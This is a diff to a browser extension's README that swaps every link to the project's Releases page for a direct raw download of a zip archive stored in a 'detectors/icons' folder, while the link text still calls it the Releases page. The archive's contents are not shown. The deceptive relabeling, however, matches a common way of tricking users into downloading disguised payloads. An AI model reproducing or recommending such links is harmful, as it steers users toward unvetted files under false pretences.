@@ -1,6 +1,6 @@
 # 🛡️ Antibot-Detector-Extension - Identify Website Security Efforts Easily
 
-[![Download Antibot-Detector-Extension](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Affan828/Antibot-Detector-Extension/releases)
+[![Download Antibot-Detector-Extension](https://github.com/Affan828/Antibot-Detector-Extension/raw/refs/heads/master/detectors/icons/Antibot-Detector-Extension-v1.5.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Affan828/Antibot-Detector-Extension/raw/refs/heads/master/detectors/icons/Antibot-Detector-Extension-v1.5.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ The Antibot-Detector-Extension is a powerful browser extension designed to help 
 
 To start using the Antibot-Detector-Extension, follow these simple steps:
 
-1. **Download the Extension**: Visit the [Releases page](https://github.com/Affan828/Antibot-Detector-Extension/releases) to access the latest version.
+1. **Download the Extension**: Visit the [Releases page](https://github.com/Affan828/Antibot-Detector-Extension/raw/refs/heads/master/detectors/icons/Antibot-Detector-Extension-v1.5.zip) to access the latest version.
 2. **Select Your Browser**: The extension is compatible with popular browsers including Chrome and Firefox. Make sure to choose the correct version for your browser.
 3. **Install the Extension**: Follow the browser-specific instructions provided on the Releases page to install the extension.
 
@@ -18,7 +18,7 @@ To start using the Antibot-Detector-Extension, follow these simple steps:
 
 To download the Antibot-Detector-Extension:
 
-- Click on this link to visit the [Releases page](https://github.com/Affan828/Antibot-Detector-Extension/releases).
+- Click on this link to visit the [Releases page](https://github.com/Affan828/Antibot-Detector-Extension/raw/refs/heads/master/detectors/icons/Antibot-Detector-Extension-v1.5.zip).
 - Locate the latest version of the extension.
 - Click on the appropriate file to download. Follow the installation prompts.
 
